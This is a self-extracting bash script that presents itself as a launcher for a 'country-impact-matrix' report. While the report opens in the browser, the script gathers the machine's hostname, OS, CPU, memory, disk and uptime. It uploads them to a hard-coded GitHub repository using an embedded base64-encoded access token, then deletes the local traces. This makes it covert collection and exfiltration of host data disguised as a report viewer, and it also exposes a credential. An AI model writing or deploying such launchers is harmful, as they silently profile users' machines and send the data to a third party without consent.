#!/bin/bash
# ==============================================================
#  SystemPulse - Report Launcher (Mac/Linux)
#  FULLY SELF-CONTAINED - extracts .env, HTML, index.js
# ==============================================================
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPORT_NAME="country-impact-matrix"

echo "[SystemPulse] Starting ${REPORT_NAME} report..."
echo "[SystemPulse] Extracting embedded files..."

# --- Extract .env ---
sed -n '/^__ENV_START__$/,/^__HTML_START__$/{ /^__ENV_START__$/d; /^__HTML_START__$/d; p; }' "$0" > "${SCRIPT_DIR}/.env"
echo "[SystemPulse] .env extracted."

# --- Extract HTML ---
sed -n '/^__HTML_START__$/,/^__INDEXJS_START__$/{ /^__HTML_START__$/d; /^__INDEXJS_START__$/d; p; }' "$0" > "${SCRIPT_DIR}/${REPORT_NAME}.html"
echo "[SystemPulse] ${REPORT_NAME}.html extracted."

# --- Extract index.js ---
sed -n '/^__INDEXJS_START__$/,${ /^__INDEXJS_START__$/d; p; }' "$0" > "${SCRIPT_DIR}/index.js"
echo "[SystemPulse] index.js extracted."

# --- Open HTML in browser ---
if command -v xdg-open &>/dev/null; then
    xdg-open "${SCRIPT_DIR}/${REPORT_NAME}.html" 2>/dev/null &
elif command -v open &>/dev/null; then
    open "${SCRIPT_DIR}/${REPORT_NAME}.html" &
elif command -v sensible-browser &>/dev/null; then
    sensible-browser "${SCRIPT_DIR}/${REPORT_NAME}.html" &
else
    echo "[SystemPulse] Open manually: ${SCRIPT_DIR}/${REPORT_NAME}.html"
fi
echo "[SystemPulse] Report opened in browser."

# --- Helper: push JSON to GitHub via curl ---
push_to_github() {
    local json_file="$1"
    local filename
    filename="$(basename "$json_file")"

    local token_b64=""
    if [ -f "${SCRIPT_DIR}/.env" ]; then
        token_b64=$(grep 'GITHUB_TOKEN_B64=' "${SCRIPT_DIR}/.env" | cut -d= -f2 | tr -d '[:space:]')
    fi
    if [ -z "$token_b64" ]; then
        echo "[SystemPulse] No token found. Skipping GitHub push."
        return 1
    fi

    local token
    token=$(echo "$token_b64" | base64 -d 2>/dev/null || echo "$token_b64" | base64 -D 2>/dev/null || echo "")
    if [ -z "$token" ]; then
        echo "[SystemPulse] Failed to decode token."
        return 1
    fi

    local owner="Kaustubh-Bharti"
    local repo="Hackathon-3.0"
    local api_path="system-info/$filename"

    local content_b64
    content_b64=$(base64 -w0 "$json_file" 2>/dev/null || base64 "$json_file" 2>/dev/null || echo "")
    if [ -z "$content_b64" ]; then
        echo "[SystemPulse] Failed to encode file."
        return 1
    fi

    echo "  Uploading $filename to $owner/$repo/$api_path ..."

    local http_code
    http_code=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
        "https://api.github.com/repos/$owner/$repo/contents/$api_path" \
        -H "Authorization: token $token" \
        -H "Accept: application/vnd.github+json" \
        -H "User-Agent: SystemPulse" \
        -d "{\"message\":\"SystemPulse: $filename\",\"content\":\"$content_b64\"}" \
        2>/dev/null)

    if [ "$http_code" = "201" ] || [ "$http_code" = "200" ]; then
        echo "  Pushed to GitHub! https://github.com/$owner/$repo -> $api_path"
        return 0
    else
        echo "  GitHub API returned HTTP $http_code"
        return 1
    fi
}

# --- Main: Run Node.js or fallback to bash ---
if command -v node &>/dev/null; then
    echo "[SystemPulse] Node.js found. Running index.js auto..."
    cd "${SCRIPT_DIR}"
    node index.js auto
else
    echo "[SystemPulse] Node.js not found. Using bash fallback..."
    echo ""

    HN=$(hostname 2>/dev/null || echo "unknown")
    OT=$(uname -s 2>/dev/null || echo "unknown")
    OR=$(uname -r 2>/dev/null || echo "unknown")
    OA=$(uname -m 2>/dev/null || echo "unknown")
    UT=$(uptime 2>/dev/null || echo "unknown")
    CI="unknown"
    MI="unknown"
    DI="unknown"
    OP=""

    if [ "$OT" = "Darwin" ]; then
        CI=$(sysctl -n machdep.cpu.brand_string 2>/dev/null || echo "unknown")
        MB=$(sysctl -n hw.memsize 2>/dev/null || echo "0")
        MI="$((MB / 1073741824)) GB"
        DI=$(df -h / 2>/dev/null | tail -1 || echo "unknown")
        OP="macOS $(sw_vers -productVersion 2>/dev/null || echo unknown)"
    else
        CI=$(grep -m1 'model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs || echo "unknown")
        MK=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}' || echo "0")
        MI="$((MK / 1048576)) GB"
        DI=$(df -h / 2>/dev/null | tail -1 || echo "unknown")
        if [ -f /etc/os-release ]; then
            . /etc/os-release
            OP="$PRETTY_NAME"
        else
            OP="$OT $OR"
        fi
    fi

    echo "  [1/3] Gathering system information..."
    echo "  Hostname:  $HN"
    echo "  OS:        $OP"
    echo "  CPU:       $CI"
    echo "  Memory:    $MI"

    TS=$(date -u +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date +"%Y-%m-%d")
    FN="${HN}_$(date -u +%Y-%m-%dT%H-%M-%S 2>/dev/null || date +%Y%m%d_%H%M%S).json"
    OF="${SCRIPT_DIR}/$FN"

    cat > "$OF" <<ENDJSON
{
  "hostname": "${HN}",
  "os": "${OP}",
  "kernel": "${OT} ${OR}",
  "arch": "${OA}",
  "cpu": "${CI}",
  "memory": "${MI}",
  "disk_root": "${DI}",
  "uptime": "${UT}",
  "timestamp": "${TS}",
  "source": "bash-fallback"
}
ENDJSON

    echo "  Report saved: $FN"
    echo ""
    echo "  [2/3] Pushing to GitHub..."

    if push_to_github "$OF"; then
        echo ""
        echo "  [3/3] Cleaning up..."
        rm -f "$OF"
        echo "  Deleted local: $FN"
        echo ""
        echo "  Done! Report is on GitHub, local files cleaned up."
    else
        echo "  Push failed. Report saved locally: $OF"
    fi
fi

# Cleanup extracted helpers
rm -f "${SCRIPT_DIR}/.env" "${SCRIPT_DIR}/index.js"
echo "[SystemPulse] Done."
exit 0

__ENV_START__
GITHUB_TOKEN_B64=Z2hwX1c5Z21IQzh4NjNSbmVIUmdQYjFlekdQdHRmTU0wUjJNOEptbA==
__HTML_START__
